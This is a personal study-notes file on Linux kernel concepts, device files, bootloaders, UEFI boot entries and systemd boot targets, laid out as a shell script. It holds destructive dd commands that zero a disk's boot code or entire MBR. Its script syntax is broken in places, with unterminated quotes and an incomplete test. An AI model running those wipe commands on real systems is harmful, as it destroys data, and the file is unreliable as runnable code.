#!/bin/sh






× ¤
             ✮ ≫ ≪ ≥ ≤ ≠ ⊕ ≽ ≼ ∑ ∉ ℤ € ₤ ₢ ℧ π μ ₨ 









Peripheral Component Interconnect (PCI)
PCI Express (PCIe)
Industry Standard Architecture (ISA)
Extended ISA (EISA)
VESA Local Bus (VLB)
Micro Channel Architecture (MCA)

Executable and Linkable Format (ELF) file format
Initial RAM Filesystem and RAM Disk (initramfs/initrd)
Redundant Array of Independent Disks (RAID)
Logical Volume Manager (LVM)

GNU Compiler Collection (GCC)








echo "##-======================================================-##"
echo "    			  [+] Monolithic kernels						"
echo "##-======================================================-##"
echo "+----------------------------------------------------------+"
echo "  [?] Contains all drivers for all types of hardware.			"
echo "  [?] regardless if your system uses that hardware.			"
echo "+----------------------------------------------------------+"


echo "##-======================================================-##"
echo "     				 [+] Microkernels							"
echo "##-======================================================-##"
 echo "+---------------------------------------------------------+"
echo "  [?] Designed so that only the least possible 				"
echo "  [?] amount of code is run In supervisor mode.				"
echo "+---------------------------------------------------------+"

echo "##-======================================================-##"
echo "     			[+] Linux kernel (hybrid kernel)				"
echo "##-======================================================-##"
echo "+----------------------------------------------------------+"
echo "[?] Capable of loading & unloading code as microkernels do.	"
echo "[?] but runs almost exclusively In supervisor mode			"
echo "+----------------------------------------------------------+"








TEMP_DIR=`mktemp -d /home/$USER/HCL.XXXXXXXXXX`
cat -vET /etc/os-release >> $TEMP_DIR/os-release
cat -vET /etc/lsb-release >> $TEMP_DIR/lsb-release
cat -vET /proc/cpuinfo >> $TEMP_DIR/cpuinfo
lspci -nnvk >> $TEMP_DIR/lspci
cat -vET /proc/scsi/scsi >> $TEMP_DIR/scsi
sudo dmidecode >> $TEMP_DIR/dmidecode
info >> $TEMP_DIR/xl-info
dmesg >> $TEMP_DIR/dmesg


if [ 
cat -vET /var/lib/parrot-core/debian_version
cat -vET /var/lib/parrot-core/issue
cat -vET /var/lib/parrot-core/issue.net
cat -vET /var/lib/parrot-core/lsb-release
cat -vET /var/lib/parrot-core/os-release
cat -vET /var/lib/parrot-core/resolv.conf.head





echo -e "\t## ============================================================================ ##"
echo -e "\t## ---------------------------------------------------------------------------- ##"
echo -e "\t\t 		[+] The Kernel is primarily responsible for 4 Main Functions:			 "
echo -e "\t## ---------------------------------------------------------------------------- ##"
echo -e "\t## ============================================================================ ##"


echo -e "\t## ============================================================================ ##"
echo -e "\t\t   						 • System Memory Management							"
echo -e "\t## ---------------------------------------------------------------------------- ##"
echo -e "\t\t  							• Software Program Management						"
echo -e "\t## ---------------------------------------------------------------------------- ##"
echo -e "\t\t    							• Hardware Management							"
echo -e "\t## ---------------------------------------------------------------------------- ##"
echo -e "\t\t    						   • Filesystem Management							"
echo -e "\t## ============================================================================ ##"







## echo "##-================================-##"
## echo "   • System Memory Management			"
## echo "##-================================-##"

## echo "##-================================-##"
## echo "   • Software Program Management		"
## echo "##-================================-##"

## echo "##-================================-##"
## echo "   • Hardware Management				"
## echo "##-================================-##"

## echo "##-================================-##"
## echo "   • Filesystem Management			"
## echo "##-================================-##"











echo "## ============================================================================ ##"
echo "[+] Memory Management - The ability to control how programs and utilities 		"
echo "				          Run within the Memory Restrictions of the system.			"
echo "## ============================================================================ ##"


echo "## ==================================================================== ##"
echo "[+] Virtual Memory - Memory that does not actually exist, but is 			"
echo "                     Created on the HD and treated as real memory.		"
echo "## ==================================================================== ##"


echo "## ============================================================================ ##"
echo "[+] Swap Space - The kernel swaps the cntents of Virtual Memory Locations back  	"
echo "                 And forth from the Swap Space to the actual Physical Memory		"
echo "## ============================================================================ ##"



echo "## ============================================================================ ##"
echo "[+] Memory Pages - Memory locations are grouped into blocks called Memory Pages	"
echo "                   The Kernel locates each page of memory In either 				"
echo "                   Physical Memory, or Swap Space.								"
echo "## ============================================================================ ##"
echo "## ---------------------------------------------------------------------------- ##"
echo -e "\t [+] The Kernel Maintains a table of Memory Pages 							"
echo -e "\t     These pages indicate which pages are In Physical Memory 				"
echo -e "\t     And which pages are swapped out to the disk. 							"
echo "## ---------------------------------------------------------------------------- ##"


echo "##-================================================================================================-##"
echo "[+] Private Memory Pages - Each process running on the system has its own Private Memory Pages. 		"
echo "                           One process cannot access Memory Pages being used by another process.		"
echo "##-================================================================================================-##"


echo "##-========================================================================================-##"
echo "   [+] Shared Memory Pages - A common Shared Memory Area In which processes may:				"  
echo "## ---------------------------------------------------------------------------------------- ##"
echo "  							• Read & Write																				"
echo "   							• To & From 																				"
echo "## ---------------------------------------------------------------------------------------- ##"
echo "   The Shared Area - Which is Maintained, and restricted by the kernel 						"
echo "## ---------------------------------------------------------------------------------------- ##"

echo "## ---------------------------------------------------------------------------------------- ##"
echo "   Each shared Memory Segment has an owner that created the segment.							"
echo "## ---------------------------------------------------------------------------------------- ##"
echo "##-========================================================================================-##"

Memory (also called RAM) is divided into 4 Kb chunks called pages.
When the system needs more memory, using a memory management scheme, it
takes an idle process’s memory pages and copies them to disk. This disk location
is a special partition called swap space or swap or virtual memory. If the idle
process is no longer idle, its memory pages are copied back into memory. This
process of copying memory pages to and from the disk swap space is called
swapping.

ipcs - allows you to view the current shared memory pages on the system.


ipcs -m

Each shared memory segment has an owner that created the segment.

Each segment also has a standard Linux permissions setting 
that sets the availability of the segment for other users.















echo "## ============================================================================ ##"
echo "    						[+] Hardware Management  								"
echo "## ============================================================================ ##"



echo "## ========================================================== ##"
echo "    [?] devices that communicate with the Linux system 
              need driver code inserted inside the kernel code. 
echo "## ========================================================== ##"


echo "## ==================================================================================== ##"
echo "    [+] driver code - allows the kernel to pass data back and forth to the device 		"
echo "     					acting as a go-between for the applications and the hardware.		"
echo "## ==================================================================================== ##"


echo "## ================================================= ##"
echo "    [?] There are two methods used for inserting 
echo "        device driver code into the Linux kernel:
echo "## ================================================= ##"
echo "## ----------------------------------------- ##"
echo "     • Drivers compiled in the kernel			 "
echo "     • Driver modules added to the kernel		 "
echo "## ----------------------------------------- ##"



echo "## ------------------------------------------------------------ ##"
echo "    • module - a self-contained driver library file that  		"
echo "      can be dynamically linked and unlinked with the kernel.		"
echo "## ------------------------------------------------------------ ##"

echo "## ------------------------------------------------------------ ##"
echo "    [?] This means that you can remove a kernel module			"
echo "        from the kernel when you’ve finished using the device		"
echo "## ------------------------------------------------------------ ##"


echo "## ========================================================== ##"
echo "     [?] There are three classifications of device files:			"
echo "## ========================================================== ##"

echo "## -------------------- ##"
echo "    •  Character			"			
echo "    •  Block				"
echo "    •  Network			"
echo "## -------------------- ##"


echo "## ==================================================================================================== ##"
echo "    [+] Character device files - are for devices that can handle data only one character at a time.		"
echo "## ==================================================================================================== ##"
echo "## ------------------------------------------------------------------------ ##"
echo "	 [?] Most types of modems and terminals are created as character files.		"
echo "## ------------------------------------------------------------------------ ##"


echo "## ==================================================================================== ##"
echo "    [+] Block device files - devices that can handle data in large blocks at a time 		"
echo "## ==================================================================================== ##"
echo "## ------------------------- ##"
echo "	 [?] such as disk drives.	 "
echo "## ------------------------- ##"



/dev/st0 (SCSI) 
/dev/ht0 (PATA)

/dev/nst0 		## non-rewinding
/dev/nht0 

/dev/st0 		## tape rewinds automatically
/dev/ht0



ONLINE status code shown indicates that the tape drive has a tape loaded and
that it’s ready for operation.


BOT status code indicates that the tape is
positioned at the beginning of the first file.


check its status:
mt -f /dev/st0 status






echo "## ======================================================================================== ##"
echo "    [+] Network device File - used For devices that use packets to send and receive data. 	"
echo "## ======================================================================================== ##"
echo "## ----------------------- ##"
echo "        These include:		"
echo "## ----------------------- ##"
echo "    •  network cards		"
echo "    •  loopback devices	"
echo "    •  network protocols	"
echo "## ----------------------- ##"







All communication with the device is performed through the device node.

Each node
has a unique number pair that identifies it to the Linux kernel.


Similar devices are grouped into
the same major device number.

The minor device number is used to identify a
specific device within the major device group



echo "## ---------------------------------------------------------------------- ##"
echo "    •  SCSI hard drive files are all marked as | block (b) devices	 |	"
echo "    •  COM port device files are marked as     | character (c) devices |	"
echo "## ---------------------------------------------------------------------- ##"



echo "## ============================================================================ ##"
echo "    					[+] Software Program Management 							"
echo "## ============================================================================ ##"


/etc/inittab - a table of processes to start automatically upon bootup.






echo "## ---------------------------------------------------------------- ##"
echo "   [?] Processes that are In brackets have been Swapped Out 			"
echo "       of memory to the Disk Swap Space - due to inactivity.			"
echo "## ---------------------------------------------------------------- ##"


echo "## ---------------------------------------------------------------- ##"
echo "   [?]  			"
echo "       			"
echo "## ---------------------------------------------------------------- ##"


echo "## ---------------------------------------------------------------------------------------- ##"

echo "## ============================================================================ ##"



echo "## ============================================================================ ##"
echo "                        [+] Filesystem Management	                                "
echo "## ============================================================================ ##"


echo "## ------------------------------------------------------------------------------------ ##"
echo "    [+] Virtual File System (VFS) - provides a standard interface for the kernel			"
echo "                     				  to communicate with any Type of filesystem.			"
echo "## ------------------------------------------------------------------------------------ ##"

echo "## ------------------------------------------------ ##"
echo "   [?] VFS caches information in memory  				"
echo "       as each filesystem is mounted and used.		"
echo "## ------------------------------------------------ ##"


echo "## =================================================================================== ##"
echo "    [+] kernel binary file - This is what the bootloader program loads into memory		"
echo "## =================================================================================== ##"







## ================================================================================================= ##
											BIOS
## ================================================================================================= ##






##-================================================================================================= ##
## +------------------------------------ [+] LILO (LInux LOader) [+] ------------------------------+ ##
##-================================================================================================= ##
	[+] /etc/lilo.conf 		## Main configuration file
##-================================================================================================= ##
## +-----------------------------------------------------------------------------------------------+ ##
		• boot			## Determines the boot drive
## +-----------------------------------------------------------------------------------------------+ ##
		• default		## Default image to boot without manual entry
## +-----------------------------------------------------------------------------------------------+ ##
		• install 		## Determines whether menu or lilo text prompt appears
## +-----------------------------------------------------------------------------------------------+ ##
		• prompt		## Same as install
## +-----------------------------------------------------------------------------------------------+ ##
		• timeout		## Value before system boots to default target
## +-----------------------------------------------------------------------------------------------+ ##
		• image			## The kernel image (full path /boot/[kernel name] )
## +-----------------------------------------------------------------------------------------------+ ##
		• root			## Root filesystem (i.e. /dev/hdb1 )
## +-----------------------------------------------------------------------------------------------+ ##
		• label			## Name of the target
## +-----------------------------------------------------------------------------------------------+ ##
##-================================================================================================= ##

Install lilo on floppy with:
/sbin/lilo -C /mnt/lilo.conf












ipxe.lkrn (PGP signature)		## Linux kernel-like image that can be started with any Linux bootloader
ipxe.pxe (PGP signature)		## PXE image for chainloading from a PXE environment
## ================================================================================================= ##



##-================================================================================================= ##
## +------------------------------------------- UEFI ----------------------------------------------+ ##
##-================================================================================================= ##
ipxe.efi (PGP signature)		## x86_64 UEFI executable

## ================================================================================================= ##

The EFI System Partition contains a small FAT32 file system (or FAT12 or FAT16 on removable media). 





hexdump -C /boot/efi/EFI/redhat/shim.efi | egrep -C 6 -i 'grub|g.r.u.b'


egrep -a -C 2 /boot/efi/EFI/redhat/shim.efi | cat -A 


strings /boot/efi/EFI/redhat/grubx64.efi | grep grub.cfg



qemu-system-x86_64 -enable-kvm -m 1G -kernel ipxe.lkrn		## the image with qemu










q

efibootmgr requires that the kernel support access to EFI non-volatile variables through

/sys/firmware/efi/vars
/sys/firmware/efi/efivars/


 · BootCurrent - the boot entry used to start the currently running system

 · BootOrder - the boot order as would appear In the boot manager.  The boot  manager  tries  to
   boot  the  first active entry In this list.  If unsuccessful, it tries the next entry, and so
   on.

 · BootNext - the boot entry which is scheduled  to  be  run  on  next  boot.   This  supercedes
   BootOrder for one boot only, and is deleted by the boot manager after first use.  This allows
   you to change the next boot behavior without changing BootOrder.

 · Timeout - the time In seconds between when the boot manager appears on the screen until  when
   it automatically chooses the startup value from BootNext or BootOrder.

 · Five boot entries (0000 - 0004), along with the active/inactive flag (* means active) and the
  name displayed on the screen.





Create new variable bootnum and add to bootorder

-c | --create


efibootmgr -n 			## Changes the boot order for the next boot only 
						## and boots from the specified partition

efibootmgr -b				## modifies and then deletes the option


efibootmgr -o 				## set the bootloader

efibootmgr -c				## creates a boot number







efibootmgr -b 4 -B 			## delete entry 4 and remove it from the BootOrder

efibootmgr -n 4				## CHANGING THE BOOT ORDER FOR THE NEXT BOOT ONLY

efibootmgr -o 3,4			## specify PXE boot first, then Linux boot.




NIST Guide on Firewalls and Firewall Policy - 
http://csrc.nist.gov/publications/nistpubs/800-41-Rev1/sp800-41-rev1.pdf


Linux Advanced Routing and Traffic Control Howto: http://lartc.org/
Clustering Shorewall: http://linuxman.wikispaces.com/Clustering+Shorewall
Iproute Downloads: https://www.kernel.org/pub/linux/utils/net/iproute2/

Iptables Tutorial: https://www.frozentux.net/documents/iptables-tutorial/






## ================================================================================================= ##
				One of three post-kernel service management systems:
## ================================================================================================= ##
1. sysvinit (LPIC-2 exam requirement)
2. upstart (older Debian/Ubuntu systems)
3. systemd (most modern distributions, new standard moving forward) 
## ================================================================================================= ##




## ================================================================================================= ##
ISOLINUX				## booting Linux from an optical disc 

EXTLINUX				## Linux filesystem - boot from ext2, ext3, ext4, or btrfs

PXELINUX				## from a network boot

SYSLINUX				## from a FAT fi lesystem

MEMDISK					## DOS - bootloader that boots older DOS systems from the other syslinux bootloaders
## ================================================================================================= ##

BOOTP, RARP and TFTP were created by the IETF




Serial console uses a serial/COM port to communicate with a serial client. 

Accessing the serial console requires a null modem serial cable attached between the COM1 port on the firewall and a serial client. A hardware serial port is required on the firewall, but the client may use a USB serial adapter if needed. 




## Install extlinux on /boot partition:
extlinux --install /boot






##-================================================================================================= ##
## +-------------------------------------- [+] isolinux [+] ---------------------------------------+ ##
##-================================================================================================= ##

echo "##-========================================================================= ##"
echo "    [+] isolinux - burn to dvd - then boot from it In the grub menu:"
echo "##-========================================================================= ##"


echo "1). Create isolinux directory under that (cd-root )"

echo "2). Copy isolinux.bin into the isolinux directory"

echo "3). Create isolinux.cfg file In that same directory"

echo "4). Create a kernel directory under the cd-root and copy the kernel into this directory"

echo "5). From cd-root , execute a command like the following example:"

mkisofs -o /tmp/mycdout.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -- ../cd-root

echo "[?] Which creates the file /tmp/mycdout.iso"





isolinux.cfg				## contains to configuration settings

isolinux.bin				## Bootloader program image

isodhpfx.bin				## Hybrid bootloader image - can be loaded onto USB (generated by xorriso)









/syslinux/syslinux.cfg

Key Options
• DEFAULT • Default boot target
• LABEL • Name of target
• SAY • Text to print when chosen
• KERNEL • Name of the kernel file
• APPEND • Additional options passed to kernel line



floppy install • 'syslinux –install /dev/fd1'


                                   





echo "                  ----------------------------------					"
echo "                  [+] SQUASHFS FILESYSTEM DESIGN [+]					"
echo "                  ----------------------------------

echo "##-===============================================================-##"
echo "   [+] A squashfs filesystem consists of a maximum of 9 parts: 		"
echo "				packed together on a byte alignment:					"
echo "##-===============================================================-##"


echo "                            ---------------
echo "                           |  superblock 	 |
echo "                           |---------------|
echo "                           |  compression  |
echo "                           |    options    |
echo "                           |---------------|
echo "                           |  datablocks   |
echo "                           |  & fragments  |
echo "                           |---------------|
echo "                           |  inode table	 |
echo "                           |---------------|
echo "                           |   directory	 |
echo "                           |     table     |
echo "                           |---------------|
echo "                           |   fragment	 |
echo "                           |    table      |
echo "                           |---------------|
echo "                           |    export     |
echo "                           |    table      |
echo "                           |---------------|
echo "                           |    uid/gid	 |
echo "                           |  lookup table |
echo "                           |---------------|
echo "                           |     xattr     |
echo "                           |     table	 |
echo "                            ---------------




											
							/\		  /\ _______________	   
							|| ====== ||  || 		 || 
##    ______________________||________||__||_________||______
##  _|======================||Squashfs||==|| Cramfs  ||==== |____
## |========================||--------||==||---------||======== |
## |________________________||________||__||_________||_________|
Max filesystem size:	     ||  2^64||	  || 256 MiB ||
Max file size:			     || 2 TiB||	  ||  16 MiB ||
Max block size:			     || 1 MiB||	  ||   4 KiB ||
Metadata compression:	     || yes	 ||	    || no ||
Directory indexes:		     || yes	 ||	    || no ||
Sparse file support:		 || yes	 ||	    || no ||
Tail-end packing (fragments):|| yes	 ||	    || no ||
Exportable (NFS etc.):		 || yes	 ||	    || no ||
Hard link support:			 || yes	 ||	    || no ||
"." and ".." in readdir:	 || yes	 ||	    || no ||
Real inode numbers:			 || yes	 ||	    || no ||
32-bit uids/gids:			 || yes	 ||	    || no ||
File creation time:			 || yes	 ||	    || no ||
Xattr support:				 || yes	 ||	    || no ||
ACL support:				 ||  no  ||	    || no ||



echo "##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##"
echo "   [?] Squashfs compresses the following:		 "
echo "##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##"	
echo "   >> data			"
echo "   >> inodes 			"
echo "   >> directories		"


echo "##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##"
echo "   [?] inode and directory data are also highly packed into byte boundaries."
echo "##~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~##"

echo "##-============================================================-##"
echo "    [?] Each compressed inode is on average 8 bytes in length 	"
echo "##-============================================================-##"
echo "     (the exact length varies on file type, 					"
echo "     (i.e. regular file, directory, symbolic link, 			"
echo "     (and block/char device inodes have different sizes).		"
echo "## ------------------------------------------------------------ ##"













PXE uses DHCP to assign a network address to the workstation and
BOOTP to load the bootloader image from the server.

the TFTP server needs to have the PXELINUX
bootloader program stored as /tftpboot/pxelinux.0

configuration file
available in the /tftpboot/pxelinux.cfg

The files are named based
on the MAC address of the workstation





1). Create directory called /tfpboot

2). Copy pxelinux.o into /tfpboot

3). Copy kernel and initrd images into /tfpboot

4). Copy library called ldlinux.c32 into /tfpboot

5). Create /tfpboot/pxelinux.cfg file




##-================================================================================================= ##
## +--------------------------------- PXE server Configurations: ----------------------------------+ ##
##-================================================================================================= ##
	boot.msg				## This file contains the message that Knoppix shows by default when you netboot
							## >> It also contains a reference to the graphic that Knoppix dis-
							## >> plays on terminals that support it.
## +-----------------------------------------------------------------------------------------------+ ##
	english.kbd				## The German keyboard mapping. If you plan on typing In German, this
							## >> will be useful to you. Otherwise, it won’t.
## +-----------------------------------------------------------------------------------------------+ ##
	logo.16A				## special graphic displayed at the PXE boot menu.
## +-----------------------------------------------------------------------------------------------+ ##
	miniroot.gz				## The initial root partition the Knoppix kernel loads that contains 
							## >> modules and other important files.
## +-----------------------------------------------------------------------------------------------+ ##
	ldlinux.c32 			## library module.
## +-----------------------------------------------------------------------------------------------+ ##
	pxelinux.0				## The syslinux bootloader
## +-----------------------------------------------------------------------------------------------+ ##
	pxelinux.cfg/default	## This file contains the full set of pxelinux configuration commands for
							## >> Knoppix. The bulk of your configuration will occur here, and I will cover it below.
## +-----------------------------------------------------------------------------------------------+ ##
	vmlinuz					## The Knoppix kernel image.
## ================================================================================================= ##









mini-bootloader image methods are from the




shim.efi			## Linux Foundation (called preloader), and Fedora (called shim)
grubx64.efi			## GRUB 2 bootloader image file

and is stored in the uefi folder on the system











echo "##-=========================================================-##"
echo "     [+] Check the group-ownership of the grub.conf file:"
echo "##-=========================================================-##"

ls -lLd /boot/grub/grub.conf
stat -c %G /boot/grub/grub.conf

echo "##-=========================================================================-##"
echo "    [?] If the group-owner of the file is not root, this must be changed"
echo "    [?] Fix: Change the group-ownership of the file.
echo "##-=========================================================================-##"
chgrp root /boot/grub/grub.conf   


echo "##-============================================-##"
echo "     [+] Check the ownership of the file.:"
echo "##-============================================-##"


ls -lLd /boot/grub/grub.conf

stat -c %U /boot/grub/grub.conf

echo "##-====================================================================-##"
echo "    [?] If the owner of the file is not root, this must be changed"
echo "    [?] Fix: Change the ownership of the file.							"
echo "##-=========================================================================-##"
chown root /boot/grub/grub.conf   



if [ -a "/boot/grub/grub.conf" ]; then
	OWNER=`stat -c %U /boot/grub/grub.conf`;
	if [ "$OWNER" != "root" ]; then
		chown root /boot/grub/grub.conf
	fi
fi




## 01_users file:

cat <<EOF
set superusers="john"
password_pbkdf2 john grub.pbkdf2.sha512.10000.19074739ED80F115963D98
4BDCB35AA671C24325755377C3E9B014D862DA6ACC77BC110EED41822800A87FD370
0C037320E51E9326188D53247EC0722DDF15FC.C56EC0738911AD86CEA55546139FE
BC366A393DF9785A8F44D3E51BF09DB980BAFEF85281CBBC56778D8B19DC94833EA
8342F7D73E3A1AA30B205091F1015A85
EOF


## The following format applies for the 40_custom file:

set superusers="john"
password_pbkdf2 john grub.pbkdf2.sha512.10000.19074739ED80F115963D98
4BDCB35AA671C24325755377C3E9B014D862DA6ACC77BC110EED41822800A87FD370
0C037320E51E9326188D53247EC0722DDF15FC.C56EC0738911AD86CEA55546139FE
BC366A393DF9785A8F44D3E51BF09DB980BAFEF85281CBBC56778D8B19DC94833EA
8342F7D73E3A1AA30B205091F1015A85














mkdir boot/grub

cp /sbin/update-grub ./
chroot /mnt/hda1 /update-grub

grub-install --root-directory=/mnt/hda1 /dev/hda









dd if=/dev/hda of=/home/knoppix/mbr_backup bs=512 count=1		## Save the MBR


the first 512 bytes of the drive (the MBR)
only want to back up the boot sector

(although it’s wise to back up the partition table as well)
replace 512 with 446


The BIOS is a 512-byte block which ends with the boot signature 0x55AA. 


> first 446 bytes of the boot block hold the boot loader, 
> 64 bytes for the partition table, 
> final two bytes of the boot signature.




A refers to a letter, 
# refers toa number

##-------------------------------------------------------------------------------------------------------##
	/dev/sd					## the Small Computer System Interface (SCSI) subsystem.
##-------------------------------------------------------------------------------------------------------##
	/dev/sdA#				## A hard disk partition on a disk that uses the SCSI subsystem.
##-------------------------------------------------------------------------------------------------------##
	/dev/fd#				## floppy disk.
##-------------------------------------------------------------------------------------------------------##
	/dev/sr#				## optical disc, accessible by using the SCSI subsystem.
##-------------------------------------------------------------------------------------------------------##
	/dev/lp#				## parallel port
##-------------------------------------------------------------------------------------------------------##
	/dev/usb/lp#			## USB printer
##-------------------------------------------------------------------------------------------------------##
	/dev/ttyS#				## RS 232 serial port
##-------------------------------------------------------------------------------------------------------##
	/dev/tty#				## text mode - login console
##-------------------------------------------------------------------------------------------------------##
	/dev/pts/#				## [+] pseudo terminal - text mode session
							##-----------------------------------------##
							## 			remote login session
							##       			or  
							## 			X text - mode console
							##-----------------------------------------##
##-------------------------------------------------------------------------------------------------------##
	/dev/bus/usb/*			## USB devices directory tree
##-------------------------------------------------------------------------------------------------------##
	/dev/snd/*				## sound hardware device files
##-------------------------------------------------------------------------------------------------------##
	/dev/input/*			## Human input devices (primarily mice)
	/dev/input/mouse# 		## provides access to specific mice.
	/dev/input/mice 		## provides access to any and all mice,
##-------------------------------------------------------------------------------------------------------##
	/dev/zero				## produces an endless string of binary 0 values.
##-------------------------------------------------------------------------------------------------------##
	/dev/null				## any data sent to /dev/null disappears.
##-------------------------------------------------------------------------------------------------------##











##-------------------------------------------------------------------------------------------------------##
						## 
##-------------------------------------------------------------------------------------------------------##
						## 
##-------------------------------------------------------------------------------------------------------##
						## 
##-------------------------------------------------------------------------------------------------------##
						## 
##-------------------------------------------------------------------------------------------------------##















lsdev			# information about installed hardware


dd if=/dev/mem bs=1k skip=768 count=256 2>/dev/null | strings ‐n 8 		# Read BIOS




dd if=/dev/zero of=/dev/hda bs=446 count=1		## blank your boot code




dd if=/dev/zero of=/dev/hda bs=512 count=1		## To clear the complete MBR, including the partition table



dd if=/dev/cdrom of=cdrom.iso bs=2048 		##  Create an ISO file from a CD-ROM, using a block size of 2 Kb

dd if=install.iso of=/dev/sdc bs=512k  		## Write an installation ISO file to a device (e.g. a USB thumb drive)





dd if=/home/knoppix/mbr_backup of=/dev/hda bs=446 count=1		## bs=446 element, this command only restores the boot code In the MBR.



dd if=mbr_backup of=/dev/hda bs=512 count=1		## restore the full 512 bytes to the MBR with:




install-mbr /dev/hda							## To remove the traces of lilo or grub from your MBR




##-================================================================================================= ##
## +--------------------------------- : ----------------------------------+ ##
##-================================================================================================= ##


## +-----------------------------------------------------------------------------------------------+ ##










































## /etc/init.d/.depend.boot
## /etc/init.d/.depend.start
## /etc/init.d/.depend.stop

/sbin/insserv --showall

/sbin/insserv --verbose



echo "## ============================================================================================ ##"
echo "   [+] /etc/inittab - The file used by the init process to determine the default boot level		"
echo "## ============================================================================================ ##"


echo "## ======================================== ##"
echo "   [+] Fields appearing In a single line:		"  
echo "## ======================================== ##"

 • id:runlevel:keyword:command


echo "## ============================================= ##"
echo "   [+] Typical default runlevel definition: 		 "
echo "## ============================================= ##"

 • id:3:initdefault:



 • 
 • 


/etc/rc.d/rc.sysinit

A script that is written to allow the system to boot In a basic state



/etc/rc.d/rc

Script that is run whenever the runlevel of a system changes

Primary sections are responsible for running START or KILL scripts


Starts/stops services on runlevel changes


The /etc/rc.d hierarchy contains symbolic links to files found within
/etc/init.d . These symlinks are then used for executing the scripts at the
appropriate runlevel.



telinit - Change SysV runlevel






• Numbers designate the order that each start or kill script is executed in, it allows a
dependency build


• Example • S13hostname is executed only AFTER the S10network script is called
(because we do not want to set a hostname before starting the network)


telinit





telinit -t 10 5				## Change to runlevel 5 after waiting 10 seconds

telinit -t ##				## The amount of time to wait to change to the indicated runlevel



##-================================================================================================= ##
## +---------------------------------- The initial RAM disk (initrd) ------------------------------+ ##
##-================================================================================================= ##





MANAGER BOOTUP
At boot, the system manager on the OS image is responsible for initializing the required file systems, 
services and drivers that are necessary for operation of the system. 

On systemd systems, this process is split up In various discrete steps 
which are exposed as target units. (systemd.target) 


The boot-up process is highly parallelized so that the order 
which specific target units are reached is not deterministic, 
but still adheres to a limited amount of ordering structure.

When systemd starts up the system, 
it will activate all units that are dependencies of default.target 
(as well as recursively all dependencies of these dependencies). 

Usually, default.target is simply an alias of graphical.target or multi-user.target, 
depending on whether the system is configured for a graphical UI 
or only for a text console. 

To enforce minimal ordering between the units pulled in, 
a number of well-known target units are available, as listed on systemd.special.


The following chart is a structural overview of these well-known units and their position In the boot-up logic. 
The arrows describe which units are pulled In and ordered before which other units. 

Units near the top are started before units nearer to the bottom of the chart.

    local-fs-pre.target
             |
             v
    (various mounts and   (various swap   (various cryptsetup
     fsck services...)     devices...)        devices...)       (various low-level   (various low-level
             |                  |                  |             services: udevd,     API VFS mounts:
             v                  v                  v             tmpfiles, random     mqueue, configfs,
      local-fs.target      swap.target     cryptsetup.target    seed, sysctl, ...)      debugfs, ...)
             |                  |                  |                    |                    |
             \__________________|_________________ | ___________________|____________________/
                                                  \|/
                                                   v
                                            sysinit.target
                                                   |
              ____________________________________/|\________________________________________
             /                  |                  |                    |                    \
             |                  |                  |                    |                    |
             v                  v                  |                    v                    v
         (various           (various               |                (various          rescue.service
        timers...)          paths...)              |               sockets...)               |
             |                  |                  |                    |                    v
             v                  v                  |                    v              rescue.target
       timers.target      paths.target             |             sockets.target
             |                  |                  |                    |
             \__________________|_________________ | ___________________/
                                                  \|/
                                                   v
                                             basic.target
                                                   |
              ____________________________________/|                                 emergency.service
             /                  |                  |                                         |
             |                  |                  |                                         v
             v                  v                  v                                 emergency.target
         display-        (various system    (various system
     manager.service         services           services)
             |             required for            |
             |            graphical UIs)           v
             |                  |           multi-user.target
             |                  |                  |
             \_________________ | _________________/
                               \|/
                                v
                      graphical.target

Target units that are commonly used as boot targets are emphasized. 
These units are good choices as goal targets, 

for example 
by passing them to the
systemd.unit= kernel command line option
or by symlinking default.target to them.







The initial RAM disk implementation (initrd) 
can be set up using systemd as well. 

Boot up inside the initrd follows the following structure.

The default target In the initrd is initrd.target. 
The bootup process begins identical to the system manager bootup (see above) until it reaches basic.target.

From there, systemd approaches the special target initrd.target. 
If the root device can be mounted at /sysroot, 
the sysroot.mount unit becomes active and
initrd-root-fs.target is reached. 

The service initrd-parse-etc.service scans /sysroot/etc/fstab for a possible /usr mount point 
and additional entries marked with the x-initrd.mount option. 

All entries found are mounted below /sysroot, 
and initrd-fs.target is reached. 

The service initrd-cleanup.service isolates to the initrd-switch-root.target, 
where cleanup services can run. 

As the very last step, the initrd-switch-root.service is activated, 
which will cause the system to switch its root to /sysroot.


                                                   : (beginning identical to above)
                                                   :
                                                   v
                                             basic.target
                                                   |                                 emergency.service
                            ______________________/|                                         |
                           /                       |                                         v
                           |                  sysroot.mount                          emergency.target
                           |                       |
                           |                       v
                           |             initrd-root-fs.target
                           |                       |
                           |                       v
                           v            initrd-parse-etc.service
                    (custom initrd                 |
                     services...)                  v
                           |            (sysroot-usr.mount and
                           |             various mounts marked
                           |               with fstab option
                           |              x-initrd.mount...)
                           |                       |
                           |                       v
                           |                initrd-fs.target
                           \______________________ |
                                                  \|
                                                   v
                                              initrd.target
                                                   |
                                                   v
                                         initrd-cleanup.service
                                              isolates to
                                        initrd-switch-root.target
                                                   |
                                                   v
                            ______________________/|
                           /                       v
                           |        initrd-udevadm-cleanup-db.service
                           v                       |
                    (custom initrd                 |
                     services...)                  |
                           \______________________ |
                                                  \|
                                                   v
                                       initrd-switch-root.target
                                                   |
                                                   v
                                       initrd-switch-root.service
                                                   |
                                                   v
                                         Transition to Host OS


MANAGER SHUTDOWN

System shutdown with systemd also consists of various target units with some minimal ordering structure applied:


                                      (conflicts with  (conflicts with
                                        all system     all file system
                                         services)     mounts, swaps,
                                             |           cryptsetup
                                             |          devices, ...)
                                             |                |
                                             v                v
                                      shutdown.target    umount.target
                                             |                |
                                             \_______   ______/
                                                     \ /
                                                      v
                                             (various low-level
                                                  services)
                                                      |
                                                      v
                                                final.target
                                                      |
                _____________________________________/ \_________________________________
               /                         |                        |                      \
               |                         |                        |                      |
               v                         v                        v                      v
    systemd-reboot.service   systemd-poweroff.service   systemd-halt.service   systemd-kexec.service
               |                         |                        |                      |
               v                         v                        v                      v
        reboot.target             poweroff.target            halt.target           kexec.target

Commonly used system shutdown targets are emphasized.











DEFAULT vmlinuz
